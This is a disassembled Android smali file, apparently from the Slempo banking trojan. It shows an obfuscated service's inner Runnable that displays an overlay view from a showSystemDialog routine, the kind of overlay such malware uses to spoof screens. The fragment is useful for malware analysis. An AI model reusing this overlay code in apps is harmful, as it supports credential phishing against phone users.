.class Lorg/slempo/service/tiunjvmkldioew$5;
.super Ljava/lang/Object;
.source "tiunjvmkldioew.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lorg/slempo/service/tiunjvmkldioew;->showSystemDialog()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .prologue
    .line 157
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 1
    return-void
.end method


# virtual methods
.method public run()V
    .locals 1

    .prologue
    .line 161
    sget-object v0, Lorg/slempo/service/tiunjvmkldioew;->OVERLAY_VIEW:Lorg/slempo/service/OverlayView;

    invoke-virtual {v0}, Lorg/slempo/service/OverlayView;->show()V

    .line 162
    return-void
.end method
